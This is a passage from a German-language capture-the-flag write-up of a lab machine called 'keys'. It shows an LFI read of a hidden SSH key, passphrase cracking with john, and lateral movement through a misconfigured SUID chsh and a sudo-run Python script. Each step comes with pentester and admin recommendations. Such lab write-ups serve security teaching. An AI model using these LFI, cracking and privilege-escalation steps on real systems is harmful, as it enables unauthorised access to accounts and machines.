+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die zuvor entdeckte LFI-Schwachstelle als `www-data` (Webserver-Benutzer), um den Inhalt von `/etc/ssh/sshd_config.d/.rachel_key.private` zu lesen: `http://192.168.2.147/readme.php?34sy=/etc/ssh/sshd_config.d/.rachel_key.private`.
+            <br><strong>Empfehlung (Admin):</strong> Verstecken Sie private Schlüssel nicht an ungewöhnlichen Orten oder mit unklaren Berechtigungen. Verwenden Sie Standardpfade (`~/.ssh/`) und korrekte Berechtigungen (`600`). Entfernen Sie irreführende Verzeichnispfade.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">useless@keys:~$ <span class="command">ls /home</span></div>
+                    <pre>jack  rachel  steve  useless</pre>
+                    <div class="prompt">useless@keys:~$ <span class="command">cd /home/rachel/the/secret/file/is/in/etc/ssh/sshd_config.d/</span></div>
+                    <div class="prompt">useless@keys:/home/rachel/the/secret/file/is/in/etc/ssh/sshd_config.d$ <span class="command">ls -la</span></div>
+                    <pre>
+total 8
+drwxrwx--- 2 <span class="command">useless</span> <span class="command">useless</span> 4096 Oct 28  2021 . <span class="comment"># Unerwartete Berechtigungen?</span>
+drwxr-xr-x 6 rachel  rachel  4096 Oct 28  2021 ..</pre>
+                    <div class="prompt">useless@keys:/home/rachel/the/secret/file/is/in/etc/ssh/sshd_config.d$ <span class="command">cd /etc/ssh/sshd_config.d</span></div>
+                    <div class="prompt">useless@keys:/etc/ssh/sshd_config.d$ <span class="command">ls -la</span></div>
+                    <pre>
+total 12
+drwxr-xr-x 2 root root     4096 Oct 28  2021 .
+drwxr-xr-x 4 root root     4096 Oct 28  2021 ..
+----r----- 1 <span class="command">root</span> <span class="command">www-data</span>  691 Oct 28  2021 <span class="command">.rachel_key.private</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der private Schlüssel von Rachel wird über die LFI-Schwachstelle ausgelesen. Die Ausgabe enthält HTML-Code und dann Base64-kodierte Daten. Der Base64-Teil wird extrahiert und dekodiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die dekodierten Daten sehen wie ein verschlüsselter privater SSH-Schlüssel aus (`Proc-Type: 4,ENCRYPTED`). Die Kopf- und Fußzeilen (`-----BEGIN * PRIVATE KEY-----`) sind jedoch durch Sternchen (`*`) ersetzt. Es fehlt auch ein Teil des Schlüssels ("someone removed those 3 lovely characters").</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Identifizieren Sie den fehlenden Schlüsseltyp. Die Struktur ähnelt PEM, aber der Typ ist unklar (* steht für RSA, DSA, EC etc.). Nutzen Sie Online-Tools oder Erfahrung, um den Typ zu erraten (hier: DSA, wie im Text erwähnt).</li><li>Ersetzen Sie die Sternchen (`*`) durch den korrekten Typ (`DSA`).</li><li>Speichern Sie den korrigierten, verschlüsselten Schlüssel in einer Datei (z.B. `key`).</li><li>Verwenden Sie `ssh2john`, um den Hash des Schlüssels zu extrahieren (`ssh2john key > key.txt`).</li><li>Verwenden Sie `john` mit einer Wortliste, um die Passphrase des Schlüssels zu knacken (`john --wordlist=/usr/share/wordlists/rockyou.txt key.txt`).</li></ol>
+            <strong>Empfehlung (Admin):</strong> Speichern Sie private Schlüssel niemals in für den Webserver lesbaren Verzeichnissen. Verwenden Sie starke Passphrasen für SSH-Schlüssel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment"># LFI Aufruf (Browser/curl):</span>
+view-source:http://192.168.2.147/readme.php?34sy=/etc/ssh/sshd_config.d/.rachel_key.private</pre>
+                     <pre><span class="comment">
+# Ausgabe (Auszug):</span>
+[...]
+ 
+someone removed those 3 lovely characters ;(
+
+<span class="password">LS0tLS1CRUdJTiAqKiogUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
+Sy1JbmZviBERVMtRURFMy1DQkMsMTk2TU1REVDMEVGQ0JEMAoKYUEzQ1c0dmlaeDBuRTM3eTBj
+TldKZnlqQlFVN1oxNVFZQTUxRmFhQTFaYWtXcTlHY0d3K29PMVBwcWIreVhrNApxUtjUjVHMy9I
+dVc4bnlDMFhIV2JHSkxiUitoMU9TTZLdU5CNzVnRFNrN0cyUmY4a21tZXdzMDdzcFppeE1wCklq
+anVQVUZcGFzVXdNZlRRK2J4WUcyZ0xDMFRXcUN0SWFHbnFDRE1SVVBRmJZkhwY0xFL093U1NI
+G9HDcKUFJZYzc1Tlh5eUFueFBCMHVMNUgvVFkxckxGTlYZ0tXN2hQTlpwYkkwdEdCYkttbWI5
+WEl1dGx5UmJxREVpVApKSUh5MTNsdTlsM2N5Nk83bkdsZ2dTMzNKVnI3cGNmcXkxSktRZ1BpY2xI
+RkVjei8vK1R2NmVBK1gxajJNenBNCmhIYXRqb29vRUd3NXVPSDZkQ3ErT3c9PQotLS0tLUVRCAq
+KiogUFJJVkFURSBLRVktLS0tLQo=</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="comment"># Base64 Dekodierung (z.B. mit CyberChef):</span>
+
+-----BEGIN * PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,196955DEC0EFCBD0
+
+aA3CW4viZx0nE37y0cNWJfyjBQU7Z15QYA51FaaA1ZakWq9GcGw+o1Ppqb+yXk4
+q9KcR5G3/HuW8nyC0XHWbGJLbR+h1NM6KuNB75gDSk7G2Rf8kmmews07spZixMp
+IjjuPUFNpasUwMfTQ+bxYG2gLC0TWqCtIaGnqCDMRUPNFbNfHpcLE/wSSH8oG87
+PRYc75NXyyAnxPB0uL5H/TY1rLF99XgKW7hPNZpbI0tGBbKmmb9XIutlyRbqDEiT
+JIHy13lu9l3cy67nGlggS33JVr7pcfqy1JKQgPiclHFEcz//+Tv6eA+X1j2MzpM
+hHatjoooEGw5uH6dCq+w
+-----END * PRIVATE KEY-----</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="comment">
+# Korrektur mit Online-Tool/Erfahrung (ersetze '*' durch 'DSA'):
+# Speichern als Datei 'key'
+</span></pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi key</span></div>
+                    <pre>
+-----BEGIN DSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,196955DEC0EFCBD0
+
+aA3CW4viZx0nE37y0cNWJfyjBQU7Z15QYA51FaaA1ZakWq9GcGw+o1Ppqb+yXk4
+q9KcR5G3/HuW8nyC0XHWbGJLbR+h1NM6KuNB75gDSk7G2Rf8kmmews07spZixMp
+IjjuPUFNpasUwMfTQ+bxYG2gLC0TWqCtIaGnqCDMRUPNFbNfHpcLE/wSSH8oG87
+PRYc75NXyyAnxPB0uL5H/TY1rLF99XgKW7hPNZpbI0tGBbKmmb9XIutlyRbqDEiT
+JIHy13lu9l3cy67nGlggS33JVr7pcfqy1JKQgPiclHFEcz//+Tv6eA+X1j2MzpM
+hHatjoooEGw5uH6dCq+w
+-----END DSA PRIVATE KEY-----</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der korrigierte, aber immer noch verschlüsselte private Schlüssel wird mit `ssh2john` verarbeitet, um einen Hash zu extrahieren, der für `John the Ripper` verständlich ist. Dieser Hash wird in `key.txt` gespeichert. Anschließend wird `john` mit der `rockyou.txt`-Wortliste auf die Hash-Datei angesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Passphrase geknackt!</span> `john` findet erfolgreich die Passphrase für den privaten DSA-Schlüssel: `<span class="password">jack4rachel</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben nun den privaten Schlüssel und dessen Passphrase. Versuchen Sie, sich per SSH als Benutzer `rachel` (da es `.rachel_key.private` hieß) anzumelden, oder als `jack` (da die Passphrase auf ihn hindeutet). Verwenden Sie die Option `-i key`, um den Schlüssel anzugeben, und geben Sie die Passphrase `jack4rachel` ein, wenn danach gefragt wird.
+             <br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, nicht erratbare Passphrasen für SSH-Schlüssel. Speichern Sie private Schlüssel sicher und mit restriktiven Berechtigungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh2john key > key.txt</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt key.txt</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">jack4rachel      (key)</span>
+1g 0:00:00:00 DONE (2022-10-13 11:25) 100.0g/s 1200Kp/s 1200Kc/s 1200KC/s jac..jack4rachel
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `jack` (basierend auf der Passphrase) mit dem privaten Schlüssel `key` anzumelden. Beim ersten Versuch gibt es eine Warnung wegen falscher Berechtigungen (`0644`). Nach Korrektur der Berechtigungen (impliziert) und Eingabe der Passphrase `jack4rachel` ist der Login erfolgreich.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiches Lateral Movement zum Benutzer `jack`. Der Angreifer hat nun eine Shell als `jack`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumeration als `jack` durch (`sudo -l`, SUID, Home-Verzeichnis, User-Flag suchen).
+             <br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass private Schlüssel korrekte Berechtigungen (`600`) haben.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i key jack@key.hmv</span></div> <span class="comment">(key.hmv ist der Hostname, IP wäre 192.168.2.147)</span>
+                     <pre>
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions <span class="password">0644</span> for 'key' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "key": <span class="password">bad permissions</span>
+jack@key.hmv's password: <span class="command">jack4rachel</span> <span class="comment"># Hier wird Passwort statt Key abgefragt wegen Fehler</span>
+Permission denied, please try again.
+jack@key.hmv's password:</pre>
+                     <div class="prompt"><span class="comment"># Annahme: Berechtigungen korrigiert (chmod 600 key) und erneut verbunden</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i key jack@key.hmv</span></div>
+                     <pre>Enter passphrase for key 'key': <span class="command">jack4rachel</span>
+Linux keys 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...]
+<span class="prompt">jack@keys:~$ </span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `jack` wird nach SUID-Binaries gesucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die meisten SUID-Binaries sind Standard. Auffällig ist jedoch: `<span class="password">/usr/bin/chsh</span>` hat SUID gesetzt und gehört dem Benutzer `root` und der Gruppe `<span class="command">jack</span>`. Dies ist eine ungewöhnliche Konfiguration. `chsh` wird verwendet, um die Login-Shell eines Benutzers zu ändern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `chsh` SUID-Root ist und der Gruppe `jack` gehört, könnte es möglich sein, dass `jack` über dieses Binary Aktionen ausführen kann, die normalerweise Root oder dem Benutzer, dessen Shell geändert wird, vorbehalten sind. Versuchen Sie, `chsh` auszuführen und sehen Sie, ob Sie die Shell eines anderen Benutzers (z.B. `rachel`) ändern oder eine Shell als ein anderer Benutzer erhalten können. Lesen Sie die Manpage (`man chsh`).
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie das SUID-Bit von `chsh`, wenn es nicht unbedingt benötigt wird, oder korrigieren Sie die Gruppenzugehörigkeit. Standardmäßig sollte `chsh` nicht der Gruppe eines normalen Benutzers gehören.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">jack@keys:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+[...]
+   129884     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
+   133533     72 -rwsr-xr-x   1 root     root        71912 Jul 28  2021 /usr/bin/su
+   133374     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
+   129888     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
+   129887     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
+   133902     36 -rwsr-xr-x   1 root     root        35040 Jul 28  2021 /usr/bin/umount
+   148720    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo
+   133900     56 -rwsr-xr-x   1 root     root        55528 Jul 28  2021 /usr/bin/mount
+     <span class="password">5542     20 -rwsr-xr--   1 root     jack        16832 Oct 29  2021 /usr/bin/chsh</span>
+   134187     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   144966    472 -rwsr-xr-x   1 root     root         481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+[...]</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `jack` wird die Datei `usAr.txt` gelesen. Anschließend wird `/usr/bin/chsh` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `usAr.txt` enthält den Flag-Teil `<span class="password">*rYnYT</span>`. Das Ausführen von `/usr/bin/chsh` führt dazu, dass der Prompt zu `<span class="prompt">rachel@keys:~$</span>` wechselt. Die SUID/Gruppen-Fehlkonfiguration von `chsh` erlaubt es `jack` offenbar, eine Shell als Benutzer `rachel` zu erlangen (möglicherweise indem er `chsh -s /bin/bash rachel` implizit ausführt oder eine andere Schwachstelle in `chsh` nutzt).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie den Flag-Teil. Sie haben nun eine Shell als `rachel`. Führen Sie Enumeration als `rachel` durch (`sudo -l` etc.).
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die SUID/Gruppen-Fehlkonfiguration von `chsh`.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jack@keys:~$ <span class="command">cat usAr.txt</span></div>
+                    <pre><span class="password">*rYnYT</span></pre>
+                    <div class="prompt">jack@keys:~$ <span class="command">/usr/bin/chsh</span></div>
+                    <div class="prompt">rachel@keys:~$ </div>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `rachel` werden die `sudo`-Rechte überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `rachel` darf den Befehl `/usr/bin/python3 /opt/number_guessing_game.py` als Benutzer `<span class="command">steve</span>` ohne Passwort (`NPASSWD`) ausführen. Dies ist der nächste Vektor für Lateral Movement.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie das Python-Skript mit `sudo -u steve ...` aus. Untersuchen Sie, was das Skript tut und ob es Schwachstellen hat, die es erlauben, Befehle als `steve` auszuführen oder Informationen preiszugeben.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit und Sicherheit dieser `sudo`-Regel. Das Ausführen von Spielen oder benutzerdefinierten Skripten mit `sudo`, selbst als anderer Benutzer, birgt Risiken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rachel@keys:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for rachel on keys:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User rachel may run the following commands on keys:
+    <span class="password">(steve) NOPASSWD: /usr/bin/python3 /opt/number_guessing_game.py</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Das Python-Skript `/opt/number_guessing_game.py` wird als `steve` ausgeführt. Das Skript fordert zur Eingabe einer Zahl zwischen 1000-9999 auf oder der "4 digits Secret Number", um Steves `id_rsa.pub`-Schlüssel zu lesen. Die Zahl `4695` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Eingabe `4695` (die Zahl aus den Dateinamen der SSH-Schlüssel) führt dazu, dass das Skript einen langen String ausgibt. Dieser String ist rückwärts geschrieben (`rev` wird später verwendet) und enthält den öffentlichen SSH-Schlüssel von `root@targetcluster`. Es enthüllt auch den Benutzernamen `steve` (aus dem `sudo -u steve`-Aufruf) und den Hostnamen `targetcluster`. Der öffentliche Schlüssel selbst ist der entscheidende Fund.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Kopieren Sie den ausgegebenen String.</li><li>Verwenden Sie `echo "..." | rev`, um den String umzudrehen und den korrekten öffentlichen SSH-Schlüssel zu erhalten.</li><li>Suchen Sie auf Ihrem lokalen System (in den mit `lftp` oder `unzip` erhaltenen Dateien) nach dem zu diesem öffentlichen Schlüssel passenden privaten Schlüssel. Verwenden Sie `grep` auf den öffentlichen Schlüssel in den `.pub`-Dateien. Der Dateiname des zugehörigen privaten Schlüssels sollte (bis auf die Endung) identisch sein (hier `a473e40621001f61dbf97b310b1caefb-4695`).</li><li>Melden Sie sich mit dem gefundenen privaten Schlüssel als `steve` per SSH an.</li></ol>
+             <strong>Empfehlung (Admin):</strong> Entfernen oder sichern Sie das Python-Skript. Geben Sie niemals private oder öffentliche Schlüssel auf diese Weise preis. Überprüfen Sie die `sudo`-Regel.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rachel@keys:~$ <span class="command">sudo -u steve /usr/bin/python3 /opt/number_guessing_game.py</span></div>
+                    <pre>
+Welcome to the guessing game :)
+
+Note:- You can guess Secret Number between 1000-9999
+or You can Give me those 4 digits Secret Number to read Steve's id_rsa.pub Key
+
+Enter Secret Number: <span class="command">4695</span>
+
+<span class="password">retsulctegrat@toor w4fwKggIuKjTjqFNzhBIDHHb6xjmJRh/pqyMTfhp9GV+w2A9i/4SeuVa30gZZMuu3LPbayIVw+TU48RBN8uVVWDo2vBtuKVdFm+ZKXfDBGz0Ud3LYm0gFzWXAB3c3F0euwCM16x2iQZHmbgMvw9xPNNKgrxLw9Z/lY+wXu8LAg5Jx8PpE+wlUXkKsxBhSiEpu7eIdUyBTYGtYIQ8e6K/TvTJT4vpoyCs52hqvQbrXCxeb5KKFRmr7ZdvmbY14dJ85IZjM4ZU3gZK97b3DyGQiGPXX/juncMigmDxZ9iz/YxaooEX3gMF9hHaIA0raILUPnL0a+5fNsGPIyAEQAAAwIBAAAAE2cy1CazN3BAAAA asr-hss</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment"># Verarbeitung auf Angreifer-System</span></pre>
+                     <div class="prompt">rachel@keys:~$ <span class="command">echo "retsulctegrat@toor w4fwKggIuKjTjqFNzhBIDHHb6xjmJRh/pqyMTfhp9GV+w2A9i/4SeuVa30gZZMuu3LPbayIVw+TU48RBN8uVVWDo2vBtuKVdFm+ZKXfDBGz0Ud3LYm0gFzWXAB3c3F0euwCM16x2iQZHmbgMvw9xPNNKgrxLw9Z/lY+wXu8LAg5Jx8PpE+wlUXkKsxBhSiEpu7eIdUyBTYGtYIQ8e6K/TvTJT4vpoyCs52hqvQbrXCxeb5KKFRmr7ZdvmbY14dJ85IZjM4ZU3gZK97b3DyGQiGPXX/juncMigmDxZ9iz/YxaooEX3gMF9hHaIA0raILUPnL0a+5fNsGPIyAEQAAAwIBAAAAE2cy1CazN3BAAAA asr-hss" | rev</span></div>
+                     <pre><span class="password">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyIPGsNf5+a0LnPULIar0AIaHh9FMg3XEooaxY/zi9ZxDmgiMcnuj/XXPGiQGyD3b79KZg3UZ4MjZI58Jd41YbmvdZ7rmRFKK5bexCXrbQvqh25sCyopv4TJTvT/K6e8QIYtGYTByUdIe7upEiShBxsKkXUlw+EpP8xJ5gAL8uXw+Yl/Z9wLxrgKNNPx9wvMgbmHZQi2x61MCwue0F3c3BAXWzFg0mYL3dU0zGBDfXKZ+mFdVKutBv2oDWVVu8NBR84UT+wVIyabPL3uuMZZg03aVueS4/i9A2w+VG9phfTMyqp/hRJmjx6bHHDIBhzNFqjTjKuIggKwf4w root@targetcluster</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird im Verzeichnis mit den heruntergeladenen/entpackten Schlüsseln (`id_rsa/2048/pub`) nach dem zuvor rekonstruierten öffentlichen Schlüssel gegrept. Der zugehörige private Schlüssel (`a473...-4695`) wird in ein Arbeitsverzeichnis kopiert und die Berechtigungen werden auf `600` gesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `grep`-Befehl findet erfolgreich die `.pub`-Datei, die zum öffentlichen Schlüssel passt. Dies bestätigt, dass der entsprechende private Schlüssel (`a473e40621001f61dbf97b310b1caefb-4695`) aus der lokalen Sammlung des Angreifers der richtige Schlüssel für den Benutzer `steve` ist (da der öffentliche Schlüssel über das Skript als `steve` extrahiert wurde).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie nun den privaten Schlüssel `a473e40621001f61dbf97b310b1caefb-4695`, um sich per SSH als Benutzer `steve` anzumelden (`ssh steve@key.hmv -i a473...-4695`).
+            <br><strong>Empfehlung (Admin):</strong> Private Schlüssel sicher aufbewahren, niemals auf unsichere Weise preisgeben.</p>
+            <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Auf Angreifer-System</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048/pub]
+└─# <span class="command">grep "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyIPGsNf5+a0LnPULIar0AIaHh9FMg3XEooaxY/zi9ZxDmgiMcnuj/XXPGiQGyD3b79KZg3UZ4MjZI58Jd41YbmvdZ7rmRFKK5bexCXrbQvqh25sCyopv4TJTvT/K6e8QIYtGYTByUdIe7upEiShBxsKkXUlw+EpP8xJ5gAL8uXw+Yl/Z9wLxrgKNNPx9wvMgbmHZQi2x61MCwue0F3c3BAXWzFg0mYL3dU0zGBDfXKZ+mFdVKutBv2oDWVVu8NBR84UT+wVIyabPL3uuMZZg03aVueS4/i9A2w+VG9phfTMyqp/hRJmjx6bHHDIBhzNFqjTjKuIggKwf4w root@targetcluster" *</span></div>
+                     <pre><span class="password">a473e40621001f61dbf97b310b1caefb-4695.pub:</span>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyIPGsNf5+a0LnPULIar0AIaHh9FMg3XEooaxY/zi9ZxDmgiMcnuj/XXPGiQGyD3b79KZg3UZ4MjZI58Jd41YbmvdZ7rmRFKK5bexCXrbQvqh25sCyopv4TJTvT/K6e8QIYtGYTByUdIe7upEiShBxsKkXUlw+EpP8xJ5gAL8uXw+Yl/Z9wLxrgKNNPx9wvMgbmHZQi2x61MCwue0F3c3BAXWzFg0mYL3dU0zGBDfXKZ+mFdVKutBv2oDWVVu8NBR84UT+wVIyabPL3uuMZZg03aVueS4/i9A2w+VG9phfTMyqp/hRJmjx6bHHDIBhzNFqjTjKuIggKwf4w root@targetcluster</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048/private]
+└─# <span class="command">cd ..</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048]
+└─# <span class="command">cp private/a473e40621001f61dbf97b310b1caefb-4695 .</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048]
+└─# <span class="command">chmod 600 a473e40621001f61dbf97b310b1caefb-4695</span></div>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `steve` mit dem identifizierten privaten Schlüssel anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Login erfolgreich!</span> Der Angreifer hat nun eine Shell als Benutzer `steve`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumeration als `steve` durch. Suchen Sie die User-Flag-Teile und den Weg zu Root.
+             <br><strong>Empfehlung (Admin):</strong> Private Schlüssel sicher aufbewahren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048]
+└─# <span class="command">ssh steve@key.hmv -i a473e40621001f61dbf97b310b1caefb-4695</span></div>
+                     <pre>
+Linux keys 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...]
+<span class="prompt">steve@keys:~$ </span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `steve` wird das Home-Verzeichnis untersucht. Es werden verschiedene User-Flag-Teile von verschiedenen Benutzern (`steve`, `useless`, `jack`, `rachel`) angezeigt und eine PGP-verschlüsselte Nachricht (`.important_message.asc`) sowie ein PGP-Private-Key (`/var/spool/mail/private_key.gpg`) gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag ist auf vier Benutzer verteilt:
+             <ul><li>Steve (`u__s__e__r.txt`): `<span class="password">*VDll6</span>`</li><li>Useless (`youser.txt`): `<span class="password">4vJkf*</span>`</li><li>Jack (`usAr.txt`): `<span class="password">*rYnYT</span>`</li><li>Rachel (`u\$eR.txt`): `<span class="password">7Q6Pw*</span>` (Pfad ist `/home/rachel/u$eR.txt`)</li></ul>
+             Die PGP-Nachricht und der private Schlüssel deuten auf den nächsten Schritt hin: Entschlüsselung der Nachricht, um möglicherweise das Root-Passwort zu finden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Notieren Sie alle vier Teile der User-Flag.</li><li>Kopieren Sie die PGP-Nachricht (`.important_message.asc`) und den privaten Schlüssel (`private_key.gpg`) auf Ihr Angreifer-System.</li><li>Verwenden Sie `gpg2john` und `john`, um die Passphrase des privaten PGP-Schlüssels zu knacken.</li><li>Importieren Sie den privaten Schlüssel in Ihr GPG-Keyring.</li><li>Entschlüsseln Sie die PGP-Nachricht mit dem importierten Schlüssel und der geknackten Passphrase.</li></ol>
+             <strong>Empfehlung (Admin):</strong> Speichern Sie private Schlüssel oder verschlüsselte Nachrichten mit sensiblen Informationen nicht an unsicheren oder ungewöhnlichen Orten wie `/var/spool/mail`. Verwenden Sie starke Passphrasen für PGP-Schlüssel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">steve@keys:~$ <span class="command">ls</span></div>
+                     <pre>u__s__e__r.txt</pre>
+                     <div class="prompt">steve@keys:~$ <span class="command">cat u__s__e__r.txt</span></div>
+                     <pre><span class="password">*VDll6</span></pre>
+                     <div class="prompt">steve@keys:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 32
+drwx------ 3 steve steve 4096 Oct 28  2021 .
+drwxr-xr-x 6 root  root  4096 Oct 28  2021 ..
+lrwxrwxrwx 1 root  root     9 Oct 28  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 steve steve  220 Oct 27  2021 .bash_logout
+-rw-r--r-- 1 steve steve 3526 Oct 27  2021 .bashrc
+<span class="command">----r----- 1 root  steve  547 Oct 28  2021 .important_message.asc</span>
+-rw-r--r-- 1 steve steve  807 Oct 27  2021 .profile
+drwx------ 2 steve steve 4096 Oct 28  2021 .ssh
+-r-------- 1 steve steve   21 Oct 28  2021 u__s__e__r.txt</pre>
+                     <div class="prompt">steve@keys:~$ <span class="command">cat .important_message.asc</span></div>
+                     <pre>
+-----BEGIN PGP MESSAGE-----
+Version: BCPG C# v1.6.1.0
+
+hQEMA6B1gxpXS1ctAQf+PTWuk5+Mi6VGX3GTNBe0S9Yci4pAvng+RZLW/Q2m
+A3ckvwiPlAWZiu7J2/TXjhRautusiXhYRb/8oX+JsXJ/2VZu8YEJGgWuySewxYm5
+r8L0IPlKaJLLsf6Vl4EtwTgXo7Zms8xNB8PyUwmEkkLvyFGFC/wNIf7sJZ31U/Z
+5iRooTYPAfwLXsc/0sQ7VeeQT++t6547QwTiw9fpKFblwzjypJfIioNWCnoLpfA5
+6xnBkkYPpr0w1zItzSBw5FHQKM0mYuf1WdAyfJ6zUytcqeSTZMN0qYkkmJfKN580
+aD84m0juc4bJJVF+5pDuduc1j5Va73Lxx46P9TNVhMlBTCDy7uPAtvrqnqLeYHH
+1zhi/qeFoS59ASvjWsfyur+wRAv6uIMuywIxD7usKIsRko6JkNN//ngcbBCudzX
+RA4=
+=voUx
+-----END PGP MESSAGE-----</pre>
+                     <div class="prompt">steve@keys:~$ <span class="command">cd /var/spool/mail</span></div>
+                     <div class="prompt">steve@keys:/var/spool/mail$ <span class="command">ls -la</span></div>
+                     <pre>
+total 12
+drwxrwsr-x  2 root mail  4096 Oct 28  2021 .
+drwxr-xr-x 12 root root  4096 Oct 27  2021 ..
